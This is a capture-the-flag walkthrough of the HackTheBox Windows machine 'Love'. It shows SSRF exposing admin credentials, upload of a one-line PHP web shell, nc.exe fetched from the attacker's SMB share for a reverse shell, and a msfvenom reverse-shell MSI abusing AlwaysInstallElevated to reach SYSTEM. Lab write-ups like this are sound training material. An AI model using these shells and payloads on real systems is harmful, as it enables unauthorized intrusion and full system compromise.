---
title: Love - HackTheBox
published: true
---

![](assets/img/love-htb/icon.png)

**Hey guys.** In this blog-post, we are going to pwn **Love** from [HackTheBox](https://www.hackthebox.eu).

**Love** is an easy-rated **windows** based box.

With that said, let us begin.

# [](#header-1)SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -sC -sV 10.10.10.239
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 03:57 IST
Nmap scan report for 10.10.10.239
Host is up (0.32s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, Help, LDAPBindReq, NCP, SMBProgNeg, WMSRequest, afp, oracle-tns: 
|_    Host '10.10.14.15' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/26%Time=60AD79EA%P=x86_64-pc-linux-gnu%r(DN
SF:SStatusRequestTCP,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(Help,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProg
SF:Neg,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourR
SF:equest,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBind
SF:Req,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4A,"F\0
SF:\0\x01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4A,"F\0\0\x
SF:01\xffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(oracle-tns,4A,"F\0\0\x01\x
SF:ffj\x04Host\x20'10\.10\.14\.15'\x20is\x20not\x20allowed\x20to\x20connec
SF:t\x20to\x20this\x20MariaDB\x20server")%r(afp,4A,"F\0\0\x01\xffj\x04Host
SF:\x20'10\.10\.14\.15'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20
SF:this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2h40m45s, deviation: 4h02m30s, median: -5h00m46s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-25T10:27:22-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-25T17:27:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.47 seconds
```

Nmap scan reveals 7 ports to be open :
* Web service (Apache httpd 2.4.46) is running on ports 80, 443 and 5000.
* Windows RPC is running on port 135.
* Netbios and SMB are running on ports 139 and 445.
* MySQL is running on port 3306, whose version is unknown as we do not get the banner.

Apart from that, we also have two subdomains from the nmap scan :
* `staging.love.htb`
* `www.love.htb`

We need to add these to the `/etc/hosts` file.

Let us now move to enumeration.

# [](#header-1)ENUMERATING SMB :

Let us check if we have any share on the SMB with null authentication. I am using `smbclient` for this.

```
┌──(root💀nehal)-[~]
└─# smbclient -L //10.10.10.239/ -U ''
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

So, we can not access the SMB as anonymous. We need to have valid credentials that we do not have right now. 

Let us move to other services.

# [](#header-1)ENUMERATING WEB SERVICES :

The below page shows up when we go to the website on port 80 :

![](assets/img/love-htb/80-home.png)

It seems to be a voting system. 

Let us see what we can get with directory brute-forcing.

```
┌──(root💀nehal)-[~]
└─# wfuzz -c -u http://10.10.10.239/FUZZ -w /usr/share/wordlists/dirb/big.txt --hc 404
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.239/FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                     
===================================================================

000000016:   403        9 L      30 W     302 Ch      ".htpasswd"                 
000000015:   403        9 L      30 W     302 Ch      ".htaccess"                 
000000895:   301        9 L      30 W     337 Ch      "Admin"                     
000000891:   301        9 L      30 W     337 Ch      "ADMIN"                     
000000957:   301        9 L      30 W     338 Ch      "Images"                     
000001816:   301        9 L      30 W     337 Ch      "admin"                     
000002904:   403        9 L      30 W     302 Ch      "aux"                       
000004349:   403        9 L      30 W     302 Ch      "cgi-bin/"                  
000004901:   403        9 L      30 W     302 Ch      "com1"                      
000004902:   403        9 L      30 W     302 Ch      "com2"                      
000004904:   403        9 L      30 W     302 Ch      "com4"                      
000004903:   403        9 L      30 W     302 Ch      "com3"                      
000005086:   403        9 L      30 W     302 Ch      "con"                       
000006173:   301        9 L      30 W     336 Ch      "dist"                      
000007237:   503        11 L     44 W     402 Ch      "examples"                  
000009378:   301        9 L      30 W     338 Ch      "images"                    
000009555:   301        9 L      30 W     340 Ch      "includes"                  
000010799:   403        11 L     47 W     421 Ch      "licenses"                  
000011142:   403        9 L      30 W     302 Ch      "lpt1"                      
000011143:   403        9 L      30 W     302 Ch      "lpt2"                      
000012826:   403        9 L      30 W     302 Ch      "nul"                       
000013833:   403        9 L      30 W     302 Ch      "phpmyadmin"                
000014017:   301        9 L      30 W     339 Ch      "plugins"                   
000014410:   403        9 L      30 W     302 Ch      "prn"                       
000016214:   403        11 L     47 W     421 Ch      "server-info"               
000016215:   403        11 L     47 W     421 Ch      "server-status"             
000017723:   301        9 L      30 W     337 Ch      "tcpdf"                     
000019518:   403        9 L      30 W     302 Ch      "webalizer"                 

Total time: 631.3452
Processed Requests: 20469                                                         
Filtered Requests: 20441                                                          
Requests/sec.: 32.42124
```
There are whole lot of directories. We have `/admin` too, which seems to be the admin panel for Voting system.
But we do not have credentials for admin.

So let us see what other web services have for us.

When we go the web service on port 5000, we get :

![](assets/img/love-htb/5000-home.png)

Okay. We are forbidden to access it.

We have a sub-domain `staging.love.htb`. Let us now go to it.

![](assets/img/love-htb/staging-home.png)

It seems a sort of File Scanner. Here, the `demo.php` looks interesting.

When we provide a URL, the server will make the request and display the response to us.

Since, the web-service on port 5000 is forbidden to us, maybe we can access it via the server.

![](assets/img/love-htb/5000-access-via-10.10.10.239.png)

Unfortunately, that did not work when we try to access it via machine IP.

However, since File Scanner service and the port 5000 web service are running on the same server, we might be able to access it via `localhost` itself. It is like we are making the server to request the service on another port that is running on the same machine. This is called Server Side Request Forgery (SSRF).

![](assets/img/love-htb/5000-access-via-localhost.png)

And this time, we are successful in making the request and it reveals the credentials for `admin` user for Voting system.

```python
User = "admin"
Pass = "@LoveIsInTheAir!!!!"
```

Let us now access the admin dashboard.

![](assets/img/love-htb/80-admin-dashboard.png)

Almost everything in the admin dashboard is useless, except for the profile updating option.

![](assets/img/love-htb/80-admin-FileUpload.png)

We can upload an image here. How about we try to upload a PHP shell ?

```php
┌──(root💀nehal)-[~]
└─# cat pwnersec.php 
<?php echo system($_GET["cmd"]); ?>
```

![](assets/img/love-htb/80-admin-uploadSuccess.png)

It looks like we are successful in uploading the shell.

The uploaded file should be in `/images`. Let us see.

![](assets/img/love-htb/80-adminRCE.png)

And we have RCE.

# [](#header-1)EXPLOITATION :

Let us first transfer `nc.exe` to the server via `smbserver`.

```
(pyTwo) ┌──(root💀nehal)-[~]
└─# /opt/impacket/examples/smbserver.py PSEC PSEC
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
┌──(root💀nehal)-[~]
└─# locate nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
┌──(root💀nehal)-[~]
└─# cp /usr/share/windows-resources/binaries/nc.exe PSEC
```

![](assets/img/love-htb/80-transferNc.exe.png)

So, `nc.exe` is transferred. Now we need to set up a listener and get a shell back.

![](assets/img/love-htb/80-triggershell.png)

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.239] 52862
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe

C:\xampp\htdocs\omrs\images>
```

We have a shell as user `phoebe`. You can read the user flag now.

# [](#header-1)PRIVILEGE ESCALATION:

Let us begin with `winpeas`.

```
C:\xampp\htdocs\omrs\images>copy \\10.10.14.15\PSEC\winPEASx64.exe
copy \\10.10.14.15\PSEC\winPEASx64.exe
        1 file(s) copied.

C:\xampp\htdocs\omrs\images>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\xampp\htdocs\omrs\images

05/25/2021  11:19 AM    <DIR>          .
05/25/2021  11:19 AM    <DIR>          ..
05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
04/12/2021  03:53 PM                 0 index.html.txt
01/27/2021  12:08 AM               844 index.jpeg
05/25/2021  04:11 PM            59,392 nc.exe
08/24/2017  04:00 AM            26,644 profile.jpg
05/25/2021  11:05 AM                36 pwnersec.php
05/25/2021  04:18 PM         1,678,336 winPEASx64.exe
               7 File(s)      1,769,492 bytes
               2 Dir(s)   3,987,992,576 bytes free
```

Now just run the binary.

```
C:\xampp\htdocs\omrs\images>winPEASx64.exe
```

This will produce a pretty large output. You can save the output on a file and transfer it to your local box for analysing.

However, the main part where we might be interested in is :

```
[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

We see that the `AlwaysInstallElevated` is set to 1. This means we can install a MSI file with elevated privileges as `administrator`. This might be a way to get administrator on the system.

First, let us create a msi package that will give us a reverse shell.

```
┌──(root💀nehal)-[~]
└─# msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=9001 --encoder x64/xor --iterations 9 --format msi --out pwnersec.msiFound 1 compatible encoders
Attempting to encode payload with 9 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor succeeded with size 543 (iteration=1)
x64/xor succeeded with size 583 (iteration=2)
x64/xor succeeded with size 623 (iteration=3)
x64/xor succeeded with size 663 (iteration=4)
x64/xor succeeded with size 703 (iteration=5)
x64/xor succeeded with size 743 (iteration=6)
x64/xor succeeded with size 783 (iteration=7)
x64/xor succeeded with size 823 (iteration=8)
x64/xor chosen with final size 823
Payload size: 823 bytes
Final size of msi file: 159744 bytes
Saved as: pwnersec.msi
```

Now copy the file to remote box.

```
C:\xampp\htdocs\omrs\images>copy \\10.10.14.15\PSEC\pwnersec.msi
copy \\10.10.14.15\PSEC\pwnersec.msi
        1 file(s) copied.
```

Now set up a listener on the specified port and cross your fingers.

```
C:\xampp\htdocs\omrs\images>msiexec /i "C:\xampp\htdocs\omrs\images\pwnersec.msi"
msiexec /i "C:\xampp\htdocs\omrs\images\pwnersec.msi"
```

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.239] 52866
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```

And we get `administrator` on the system. You can now read the root flag too.

So that was **LOVE** from **HackTheBox**. 

**Thanks** for reading this far. I hope you liked it.

I will see you in the next write-up. **PEACE**.